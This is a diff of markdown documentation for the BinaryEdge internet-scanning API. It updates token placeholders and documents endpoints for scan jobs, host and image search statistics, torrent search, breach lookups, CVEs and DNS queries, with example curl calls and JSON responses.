@@ -15,8 +15,13 @@
 **Key Header** : X-Token
 
 ```shell
-curl 'https://api.binaryedge.io/v1/<endpoint>' -H 'X-Token:XXXXXXXX'
+curl 'https://api.binaryedge.io/v1/<endpoint>' -H 'X-Token:API_TOKEN'
 ```
+
+## Swagger Definition
+
+You can download the Swagger OpenApi specification file : [v1.yaml](/swagger/v1.yaml). You can use this with Postman or any other client tool.
+
 
 ## How to use BinaryEdge’s API
 
@@ -27,8 +32,8 @@ Note: all requests are identified by Job ID and are shown in the stream window.
 
 |   | Input                                                                                                                                                                                                                                                                                                   | Output                                                    |
 |---|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------|
-| 1 | Connect to Data Stream <br> `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:InsertYourClientToken' `                                                                                                                                                                                                                                     | (data stream)                                             |
-| 2 | Request a Scan Task <br> `curl 'https://api.binaryedge.io/v1/tasks' -d '{"type":"scan", "description": "InsertYourDescriptionHere", "options":[{"targets":["InsertAnIPAddress/IPNetwork"], "ports":[{"port":InsertPort, "protocol": "tcp or udp", "modules": ["InsertModule"]}]}]}' -v -H 'X-Token:InsertYourClientToken'` | {"stream_url":"stream URL", "job_id":"Job ID"}             |
+| 1 | Connect to Data Stream <br> `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:API_TOKEN' `                                                                                                                                                                                                                                     | (data stream)                                             |
+| 2 | Request a Scan Task <br> `curl 'https://api.binaryedge.io/v1/tasks' -d '{"type":"scan", "description": "InsertYourDescriptionHere", "options":[{"targets":["InsertIPAddress/IPNetwork/ASN/CountryCode"], "ports":[{"port":"InsertPort/PortRange", "protocol": "tcp/udp", "modules": ["InsertModule"], "config": {"InsertConfigKey", "InsertConfigValue"}, "sample": "InsertSampleSize"}]}]}' -v -H 'X-Token:API_TOKEN'` | {"stream_url":"stream URL", "job_id":"Job ID"}             |
 
 
 ## Index
@@ -40,49 +45,44 @@ Note: all requests are identified by Job ID and are shown in the stream window.
     * [4. sinkhole](#4-sinkhole)
 
 * [Tasks](#tasks)
-    * [GET /v1/tasks - List Requested Jobs](#get-v1tasks---list-requested-jobs)
-        * [POST /v1/tasks - Create Job](#post-v1tasks---create-scan-job)
-        * [POST /v1/tasks/job_id/revoke - Job Revoke](#post-v1tasksjob_idrevoke---revoke-job)
-        * [GET /v1/replay/job_id - Replay Job](#get-v1replayjob_id---replay-job)
-        * [Job Status](#job-status)
-        * [Supported Types](#supported-job-types)
-            * [1. scan](#1-scan)
-            * [2. grab](#2-grab)
+    * [GET /v1/tasks - List Requested Jobs](#get-v1tasks-list-requested-jobs)
+    * [POST /v1/tasks - Create Job](#post-v1tasks-create-job)
+    * [GET /v1/tasks/job_id/stats - Job Stats](#get-v1tasksjob_idstats-job-stats)
+    * [POST /v1/tasks/job_id/revoke - Job Revoke](#post-v1tasksjob_idrevoke-job-revoke)
+    * [GET /v1/replay/job_id - Replay Job](#get-v1replayjob_id-replay-job)
+
+* [Job Status](#job-status)
+
+* [Supported Types](#supported-job-types)
+    * [1. scan](#1-scan)
+    * [2. grab](#2-grab)
 
 * [Supported Modules](#supported-modules-types)
-    * [1. elasticsearch](#1-elasticsearch)
-    * [2. http & https](#2-http--https)
-    * [3. memcached](#3-memcached)
-    * [4. mongodb](#4-mongodb)
-    * [5. mqtt](#5-mqtt)
-    * [6. rdp](#6-rdp)
-    * [7. redis](#7-redis)
-    * [8. service](#8-service)
-    * [9. service-simple](#9-service-simple)
-    * [10. ssh](#10-ssh)
-    * [11. ssl](#11-ssl)
-    * [12. telnet](#12-telnet)
-    * [13. vnc](#13-vnc)
-    * [14. web](#14-web)
-    * [15. x11](#15-x11)
+    * [Custom Modules](#custom-modules)
 
 * [Configurations](#configurations)
+    * [Available configurations](#available-configurations)
 
 * [Query Endpoints](#query-endpoints)
     * [Host](#host)
         * [/v1/query/historical/{target}](#v1queryhistoricaltarget)
         * [/v1/query/latest/{target}](#v1querylatesttarget)
         * [/v1/query/search](#v1querysearch)
+        * [/v1/query/search/stats](#v1querysearchstats)
 
     * [Image](#image)
         * [/v1/query/image/ip/{target}](#v1queryimageiptarget)
         * [/v1/query/image](#v1queryimage)
         * [/v1/query/image/{image_id}](#v1queryimageimage_id)
-        * [/v1/query/image/search](#v1queryimagesearchoptions)
+        * [/v1/query/image/search](#v1queryimagesearch)
+        * [/v1/query/image/search/stats](#v1queryimagesearchstats)
+        * [/v1/query/image/search/similar](#v1queryimagesearchsimilar)
 
     * [Torrent](#torrent)
-        * [/v1/query/torrent/{target}](#v1querytorrenttarget)
+        * [/v1/query/torrent/historical/{target}](#v1querytorrenthistoricaltarget)
         * [/v1/query/torrent/latest/{target}](#v1querytorrentlatesttarget)
+        * [/v1/query/torrent/search](#v1querytorrentsearch)
+        * [/v1/query/torrent/search/stats](#v1querytorrentsearchstats)
 
     * [Dataleaks](#dataleaks)
         * [/v1/dataleaks/check/{email}](#get-v1dataleakscheckemail)
@@ -141,7 +141,7 @@ _Endpoint_: https://stream.api.binaryedge.io/v1/sinkhole
 
 _Description_: This stream contains data generated by our "listen-only" machines, i.e., what everyone else has been scanning on our machines.
 
-See [Sinkhole Data](sinkhole.md) for details.
+See [Sensor Data](sensors.md) for details.
 
 ## Tasks
 
@@ -149,6 +149,7 @@ See [Sinkhole Data](sinkhole.md) for details.
 
 Retrieve a list of the latest requested jobs. This includes:
 
+* "description": Description of the job, as specified on the request;
 * "status": Status of the job. Where status can be:
     * "requested": Job was requested successfully;
     * "revoked": Job was revoked by user;
@@ -160,33 +161,58 @@ Retrieve a list of the latest requested jobs. This includes:
 * "options": Job configuration options.
 
 ```shell
-curl 'https://api.binaryedge.io/v1/tasks' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/tasks' -H 'X-Token:API_TOKEN'
 
 HTTP/1.1 200 OK
 
 [{"status": "Success", "requested_at": "2017-04-10T17:44:58.636681+00:00", "description": "Job Description 1", "finished_at": "2017-04-10T17:47:46.534544+00:00", "options": [{"targets": ["xxx.xxx.xxx.xxx"], "ports": [{"modules": ["service", "service-simple", "ssh"], "port": "80,8080"}]}], "job_id": "32637b98-8f01-46eb-a1f7-3eaee18ab1d5"}, {"status": "Success", "requested_at": "2017-04-10T17:39:53.066632+00:00", "description": "Test web", "finished_at": "2017-04-10T17:41:57.919141+00:00", "options": [{"targets": ["example.org"], "ports": [{"config": {"https": true}, "modules": ["web"], "port": 443}]}], "job_id": "73364d62-d768-4dbd-9947-aba2a453dfb7"}]
 ```
 
-### POST /v1/tasks - Create Scan Job
+### POST /v1/tasks - Create Job
 
 Create a On-Demand Job. You can specify your own targets, ports, modules and configurations.
 
 Parameters:
 
-* "type": "scan" or "grab". Please refer to [Supported Types](#supported-types);
+* "type": "scan" or "grab". Please refer to [Supported Job Types](#supported-job-types);
 * "description": Add your own description of the job. Can be a empty string, i.e. "";
 * "options": Configuration Options for the job, array of JSON objects. One Job can have multiple options.
 
 ```shell
-curl 'https://api.binaryedge.io/v1/tasks' -d '{"type":"scan", "description": "InsertYourDescriptionHere", "options":[{"targets":["InsertAnIPAddress/IPNetwork"], "ports":[{"port":InsertPort, "protocol": "tcp or udp", "modules": ["InsertModule"]}]}]}' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/tasks' -d '{"type":"scan", "description": "InsertYourDescriptionHere", "options":[{"targets":["InsertIPAddress/IPNetwork/ASN/CountryCode"], "ports":[{"port":"InsertPort/PortRange", "protocol": "tcp/udp", "modules": ["InsertModule"]}]}]}' -H 'X-Token:API_TOKEN'
 ```
 
-### POST /v1/tasks/job_id/revoke - Revoke Job
+### GET /v1/tasks/job_id/stats - Job Stats
+
+Retrieve statistics about a previously requested scan job. This includes:
+
+* "status": Status of the job. Where status can be:
+    * "requested": Job was requested successfully;
+    * "revoked": Job was revoked by user;
+    * "success": Job completed successfully;
+    * "failed": Job completed, but did not finish.
+* "number_results": Number of events returned.
+* "open_ports": Number of open ports detected.
+* "ports": List of open ports detected.
+* "targets": Number of targets that responded.
+* "grabbers": Grabber specific statistics.
+    * "type": Grabber type.
+    * "port": Port number.
+    * "count": Number of events for a specific grabber type and port number.
+
+```shell
+curl 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/stats' -H 'X-Token:API_TOKEN'
+
+HTTP/1.1 200 OK
+{"stats":"<STATS>"}
+```
+
+### POST /v1/tasks/job_id/revoke - Job Revoke
 
 To cancel a requested job:
 
 ```shell
-curl -XPOST 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/revoke' -H  'X-Token:InsertYourClientToken'
+curl -XPOST 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/revoke' -H  'X-Token:API_TOKEN'
 
 HTTP/1.1 200 OK
 {"message": "Job revoked"}
@@ -197,7 +223,7 @@ HTTP/1.1 200 OK
 To retrieve the results from a previously requested scan job, you can replay the stream with this endpoint.
 
 ```shell
-curl 'https://stream.api.binaryedge.io/v1/replay/<JOB_ID>' -H 'X-Token:InsertYourClientToken'
+curl 'https://stream.api.binaryedge.io/v1/replay/<JOB_ID>' -H 'X-Token:API_TOKEN'
 
 HTTP/1.1 200 OK
 <Stream results from request job>
@@ -212,7 +238,7 @@ In order for you to know the status of your jobs we provide information in 2 dis
 To check the current status of a Requested job:
 
 ```shell
-curl 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/status' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/tasks/<JOB_ID>/status' -H 'X-Token:API_TOKEN'
 
 HTTP/1.1 200 OK
 {"status":"<STATUS>"}
@@ -220,10 +246,10 @@ HTTP/1.1 200 OK
 
 Where Status can be:
 
-  * "requested": Job was requested successfully;
-  * "revoked": Job was revoked by user;
-  * "success": Job completed successfully;
-  * "failed": Job completed, but did not finish.
+* "requested": Job was requested successfully;
+* "revoked": Job was revoked by user;
+* "success": Job completed successfully;
+* "failed": Job completed, but did not finish.
 
 #### 2. Status Messages inside stream
 
@@ -235,8 +261,7 @@ In your stream you will find messages providing insight on the current status of
 {
   "origin": {
     "job_id": "c4773cb-aa1e-4356eac1ad08",
-    "type": "job_status",
-    ...
+    "type": "job_status"
   },
   "status": {
     "success": null,
@@ -253,8 +278,7 @@ In your stream you will find messages providing insight on the current status of
 {
   "origin": {
     "job_id": "c4773cb-aa1e-4356eac1ad08",
-    "type": "job_status",
-    ...
+    "type": "job_status"
   },
   "status": {
     "success": true,
@@ -278,92 +302,22 @@ Meaning of the status fields:
 There are 2 types of requests.
 
 ### 1. scan
-The scan type will request a portscan on the targets and will launch the modules against the detected open ports. It should be used against a large number of targets and its function is to filter responding IPs. Note: scanning only works with IP addresses, not domains.
+The scan type will request a portscan on the targets and will launch the modules against the detected open ports only. It can be used against any number of targets. 
+
+It's highly recommended to use if there is a large number of targets, this way it filters responding IPs before launching modules, which can speed up a job greatly.
+
+Scanning supports both IP addresses and domains, but since portscan will resolve domains and use their IP addresses, some domains' results might only obtainable if you use the _grab_ type directly on them.
 
 ### 2. grab
-The grab type will try to gather information directly from the targets, without portscanning first. Should be used against a small number of targets.
+The grab type will try to gather information directly from the targets, without portscanning first. Should only be used against a small number of targets, since it will launch the modules against all targets without and filtering first.
 
-Recommended for when targeting Domains, with Web and HTTP/HTTPS modules. 
+Recommended mostly for when targeting domains, for instance with HTTP/HTTPS, Web or SSL modules. 
 
 ## Supported Modules Types
 
-### 1. elasticsearch
-_Description_: Extract Elasticsearch detailed information.
+See [List of Modules](modules.md) for a list of all available modules and their descriptions.
 
-_Detailed documentation_: [elasticsearch module documentation](modules/elasticsearch.md "elasticsearch")
-
-### 2. http & https
-_Description_: Extract HTTP/HTTPS information, e.g. HTTP headers, HTTP status codes, HTTP body, and redirects information. Follows up to 5 redirects.
-
-_Detailed documentation_: [http & https module documentation](modules/http.md "http")
-
-### 3. memcached
-_Description_: Extract Memcached detailed information.
-
-_Detailed documentation_: [memcached module documentation](modules/memcached.md "memcached")
-
-### 4. mongodb
-_Description_: Extract MongoDB detailed information.
-
-_Detailed documentation_: [mongodb module documentation](modules/mongodb.md "mongodb")
-
-### 5. mqtt
-_Description_: Grab MQTT information, including messages and topics.
-
-_Detailed documentation_: [mqtt module documentation](modules/mqtt.md "mqtt")
-
-### 6. rdp
-_Description_: Extract RDP details and screenshot.
-
-_Detailed documentation_: [rdp module documentation](modules/rdp.md "rdp")
-
-### 7. redis
-_Description_: Extract Redis detailed information.
-
-_Detailed documentation_: [redis module documentation](modules/redis.md "redis")
-
-### 8. service
-_Description_: Extract detailed product specific information, e.g. product name, version, headers, scripts. If you just want product name and version, consider using the faster "service-simple".
-
-_Detailed documentation_: [service module documentation](modules/service.md "service")
-
-### 9. service-simple
-_Description_: Extract basic product specific information, e.g. product name, version. This module is much faster than "service", since it returns less information.
-
-_Detailed documentation_: [service-simple module documentation](modules/service-simple.md "service-simple")
-
-### 10. ssh
-
-_Description_: Extract SSH details, e.g. key and algorithms for SSH servers.
-
-_Detailed documentation_: [ssh module documentation](modules/ssh.md "ssh")
-
-### 11. ssl
-_Description_: Extract SSL details e.g. type of encryption.
-
-_Detailed documentation_: [ssl module documentation](modules/ssl.md "ssl")
-
-### 12. telnet
-_Description_: Extract Telnet information, e.g. Will, Do, Don't Won't commands.
-
-_Detailed documentation_: [telnet module documentation](modules/telnet.md "telnet")
-
-### 13. vnc
-_Description_: Extract VNC details and screenshot.
-
-_Detailed documentation_: [vnc module documentation](modules/vnc.md "vnc")
-
-### 14. web
-_Description_: Extract Web technologies information and headers.
-
-_Detailed documentation_: [web module documentation](modules/web.md "web")
-
-### 15. x11
-_Description_: Extract x11 screenshot.
-
-_Detailed documentation_: [x11 module documentation](modules/x11.md "x11")
-
-### *Custom Modules*
+### Custom Modules
 Note: If you want a custom-made module, please contact BinaryEdge.
 
 ## Configurations
@@ -374,29 +328,28 @@ Example:
 
 ```json
 {
-   "type": "scan",
-   "description": "test a bunch of networks",
-   "options": [
-       {
-         "targets": ["xxx.xxx.x.x/xx","xxx.xxx.x.x/xx"],
-         "ports": [
-           {
-            "port": 80,
-            "modules": ["http"],
-            "config":
-              {
-                "user_agent":"Test user Agent",
-                "host_header":"google.com"
-              }
-           }]
-       }
-     ]
+  "type": "scan",
+  "description": "test a bunch of networks",
+  "options": [
+    {
+      "targets": ["xxx.xxx.x.x/xx","xxx.xxx.x.x/xx"],
+      "ports": [{
+        "port": 80,
+        "modules": ["http"],
+        "config":
+          {
+            "user_agent":"Test user Agent",
+            "host_header":"google.com"
+          }
+      }]
+    }
+  ]
 }
 ```
 
 ### Available configurations
 
-Check each module's detailed documentation for the available configurations.
+Check each module's detailed documentation for the available configurations. See [List of Modules](modules.md).
 
 
 ## Query Endpoints
@@ -420,7 +373,7 @@ List of events for the specified host, with events for each time that:
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/historical/222.208.xxx.xxx' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/historical/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -461,7 +414,7 @@ Details about an Host. List of recent events for the specified host, including d
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/latest/222.208.xxx.xxx' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/latest/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -498,13 +451,12 @@ Events based on a Query. List of recent events for the given query, including de
 *Parameters*
 
 * query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
-* page: [Int] Optional. Default 1
-* pagesize: [Int] Optional. Default 100
+* only_ips: [Int] Optional. If selected, only output IP addresses, ports and protocols.
 
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/search?query=product:mysql%20AND%20country:ES' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/search?query=product:mysql%20AND%20country:ES' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -540,6 +492,50 @@ curl 'https://api.binaryedge.io/v1/query/search?query=product:mysql%20AND%20coun
 }
 ```
 
+#### /v1/query/search/stats 
+
+Statistics of recent events for the given query. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
+* type: [String] Type of statistic we want to obtain. Possible types include:
+    * _ports_, _products_, _versions_, _tags_, _services_, _countries_, _asn_.
+* order: [String] Whether to sort descendently or ascendently to get the top.
+    * _desc_, _asc_
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/search/stats?query=product:mysql%20AND%20country:ES&type=ports' -H 'X-Key:API_TOKEN'
+```
+
+```json
+[
+  {
+    "key": "3306/tcp", 
+    "doc_count": 42761
+  }, 
+  {
+    "key": "102/tcp", 
+    "doc_count": 5
+  }, 
+  {
+    "key": "1234/tcp", 
+    "doc_count": 5
+  }, 
+  {
+    "key": "1911/tcp", 
+    "doc_count": 5
+  }, 
+  {
+    "key": "5001/tcp", 
+    "doc_count": 5
+  }
+]
+```
+
+
 ### Image
 
 #### /v1/query/image/ip/{target}
@@ -573,7 +569,7 @@ Details about Remote Desktops found on an Host. List of screenshots and details 
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/image/ip/XXX.XXX.XXX.XXX?ocr=1' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/image/ip/XXX.XXX.XXX.XXX?ocr=1' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -625,7 +621,7 @@ List of Remote Desktops found (latest first).
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/image' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/image' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -681,7 +677,7 @@ Details about a specific Remote Desktop. This includes the following information
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/image/f1b0a311af803ea73ac48adce2378f58adce2378f5?ocr=1' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/image/f1b0a311af803ea73ac48adce2378f58adce2378f5?ocr=1' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -728,7 +724,7 @@ List of Remote Desktops based on a Query. Can be used with specific parameters a
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/image/search?ip=120.XXX.XXX.XXX'  -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/image/search?ip=120.XXX.XXX.XXX'  -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -764,7 +760,50 @@ curl 'https://api.binaryedge.io/v1/query/image/search?ip=120.XXX.XXX.XXX'  -H 'X
 }
 ```
 
-#### /v1/query/image/search
+#### /v1/query/image/search/stats 
+
+Statistics of recent events for the given query. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](image-search.md) for details on what parameters can be used.
+* type: [String] Type of statistic we want to obtain. Possible types include:
+    * _ports_, _words_, _tags_, _countries_, _asn_, _rdns_.
+* order: [String] Whether to sort descendently or ascendently to get the top.
+    * _desc_, _asc_
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/image/search/stats?query=tags:rdp%20AND%20country:ES&type=ports' -H 'X-Key:API_TOKEN'
+```
+
+```json
+[
+  {
+    "key": "3389/tcp", 
+    "doc_count": 161165
+  }, 
+  {
+    "key": "3388/tcp", 
+    "doc_count": 4755
+  }, 
+  {
+    "key": "80/tcp", 
+    "doc_count": 122
+  }, 
+  {
+    "key": "3386/tcp", 
+    "doc_count": 121
+  }, 
+  {
+    "key": "443/tcp", 
+    "doc_count": 109
+  }
+]
+```
+
+#### /v1/query/image/search/similar
 
 List of Remote Desktops that are similar to another Remote Desktop.
 Note: This option cannot be used together with the previous ones.
@@ -776,7 +815,7 @@ Note: This option cannot be used together with the previous ones.
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/image/search?similar=f1b0a311af803ea73ac48adce2378f58adce2378f5' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/image/search/similar?similar=f1b0a311af803ea73ac48adce2378f58adce2378f5' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -809,9 +848,10 @@ curl 'https://api.binaryedge.io/v1/query/image/search?similar=f1b0a311af803ea73a
 }
 ```
 
+
 ### Torrent
 
-#### /v1/query/torrent/{target}
+#### /v1/query/torrent/historical/{target}
 
 Details about torrents transferred by an Host, with data up to 6 months.
 
@@ -824,7 +864,7 @@ List of torrent events for the specified host, with events for each time that a 
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/torrent/222.208.xxx.xxx' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/torrent/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -862,7 +902,7 @@ Details about torrents transferred by an Host. List of recent torrent events for
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/torrent/latest/222.208.xxx.xxx' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/torrent/latest/222.208.xxx.xxx' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -889,6 +929,123 @@ curl 'https://api.binaryedge.io/v1/query/torrent/latest/222.208.xxx.xxx' -H 'X-T
 }
 ```
 
+#### /v1/query/torrent/search
+
+Events based on a Query. List of recent events for the given query, including details of the peer and torrent. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
+* page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+* pagesize: [Int] Optional. Default 100
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/torrent/search?query=category:video' -H 'X-Key:API_TOKEN'
+```
+
+```json
+{
+  "query":"category:video",
+  "page":1,
+  "pagesize":20,
+  "total":3149612,
+  "events":[
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1565166671255
+      },
+      "node":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":2949
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":6881
+      },
+      "torrent":{
+        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
+        "name":"Britain's Best Back Gardens Series",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"TV shows"
+      }
+    },
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1565166671242
+      },
+      "node":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":8999
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":24279
+      },
+      "torrent":{
+        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
+        "name":"Britain's Best Back Gardens Series",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"TV shows"
+      }
+    }
+  ]
+}
+```
+
+#### /v1/query/torrent/search/stats
+
+Statistics of events for the given query. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
+* type: [String] Type of statistic we want to obtain. Possible types include:
+    * _ports_, _countries_, _asn_, _ips_, _rdns_, _categories_, _names_.
+* days: [Integer] Number of days to get the stats for. For example days=1 for the last day of data.
+    * Max: 90 (default)
+* order: [String] Whether to sort descendently or ascendently to get the top.
+    * _desc_, _asc_
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/torrent/search/stats?query=category:video&type=ports' -H 'X-Key:API_TOKEN'
+```
+
+```json
+[
+  {
+    "key":1,
+    "doc_count":168056
+  },
+  {
+    "key":8999,
+    "doc_count":133738
+  },
+  {
+    "key":6881,
+    "doc_count":91512
+  },
+  {
+    "key":51413,
+    "doc_count":58998
+  },
+  {
+    "key":1200,
+    "doc_count":35127
+  }
+]
+```
+
+
 ### Dataleaks
 
 Allows you to search across multiple data breaches to see if any of your email addresses has been compromised. If you are affected, we recommend you change your password on the respective services.
@@ -904,33 +1061,33 @@ Verify how many dataleaks affected an specific email address.
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/dataleaks/check/user@example.com' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/dataleaks/check/user@example.com' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
 {
-   "total_records":19,
-   "events":[
-      "antipublic",
-      "ashleymadison",
-      "breachcompilation",
-      "cannabis",
-      "customerslive",
-      "dropbox",
-      "exploitin",
-      "fling",
-      "imesh",
-      "lastfm",
-      "linkedin",
-      "mate1",
-      "neopets",
-      "pastebin",
-      "rsboards",
-      "tianya",
-      "torrentinvites",
-      "tumblr",
-      "vk"
-   ]
+  "total_records":19,
+  "events":[
+    "antipublic",
+    "ashleymadison",
+    "breachcompilation",
+    "cannabis",
+    "customerslive",
+    "dropbox",
+    "exploitin",
+    "fling",
+    "imesh",
+    "lastfm",
+    "linkedin",
+    "mate1",
+    "neopets",
+    "pastebin",
+    "rsboards",
+    "tianya",
+    "torrentinvites",
+    "tumblr",
+    "vk"
+  ]
 }
 ```
 
@@ -949,7 +1106,7 @@ Verify how many emails are affected by dataleaks for a specific domain.
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/dataleaks/organization/example.com' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/dataleaks/organization/example.com' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -975,21 +1132,21 @@ Get all available information about the dataleaks our platform keeps track.
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/dataleaks/leaks?leak=ashleymadison' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/dataleaks/leaks?leak=ashleymadison' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
 {  
-   "ashleymadison":{  
-      "name":"ashleymadison",
-      "techname":"ashleymadison",
-      "year":"2015",
-      "description":"Ashley Madison is a canadian online dating service for married/ commited people.",
-      "label":"Adult",
-      "data":"email addresses, passwords, usernames, dates of birth, names, payment history, phone numbers, physical addresses, website activity",
-      "logo":"https://s3-eu-west-1.amazonaws.com/be-resources/dataleaks/ashleymadison.jpg",
-      "fullname":"Ashley Madison"
-   }
+  "ashleymadison":{  
+    "name":"ashleymadison",
+    "techname":"ashleymadison",
+    "year":"2015",
+    "description":"Ashley Madison is a canadian online dating service for married/ commited people.",
+    "label":"Adult",
+    "data":"email addresses, passwords, usernames, dates of birth, names, payment history, phone numbers, physical addresses, website activity",
+    "logo":"https://s3-eu-west-1.amazonaws.com/be-resources/dataleaks/ashleymadison.jpg",
+    "fullname":"Ashley Madison"
+  }
 }
 ```
 
@@ -1009,7 +1166,7 @@ More details about scoring can be found on [https://github.com/binaryedge/ratemy
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/score/ip/xxx.xxx.xxx.xxx' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/score/ip/xxx.xxx.xxx.xxx' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -1749,7 +1906,7 @@ Get list of CVEs that migh affect a specific IP.
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/cve/ip/xxx.xxx.xxx.xxx' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/cve/ip/xxx.xxx.xxx.xxx' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -1913,6 +2070,7 @@ curl 'https://api.binaryedge.io/v1/query/cve/ip/xxx.xxx.xxx.xxx' -H 'X-Token:Ins
 }
 ```
 
+
 ### Domains
 
 What is exposed via DNS? What subdomains belong to a Domain? What domains are served by IP X?
@@ -1930,7 +2088,7 @@ Return list of subdomains known from the target domains
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/domains/subdomain/example.com' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/domains/subdomain/example.com' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -1963,7 +2121,7 @@ Possible types of records currently available:
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/domains/dns/example.com' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/domains/dns/example.com' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -2011,7 +2169,7 @@ Return records that have the specified IP address in their A or AAAA records.
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/domains/ip/8.8.8.8' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/domains/ip/8.8.8.8' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -2075,7 +2233,7 @@ List of Domains/DNS data based on a Query.  Can be used with specific parameters
 *Output*
 
 ```shell
-curl 'https://api.binaryedge.io/v1/query/domains/search?query=A:127.0.0.1' -H 'X-Token:InsertYourClientToken'
+curl 'https://api.binaryedge.io/v1/query/domains/search?query=A:127.0.0.1' -H 'X-Token:API_TOKEN'
 ```
 
 ```json
@@ -2098,11 +2256,10 @@ curl 'https://api.binaryedge.io/v1/query/domains/search?query=A:127.0.0.1' -H 'X
     "domain": "vit.press",
     "root": "vit.press",
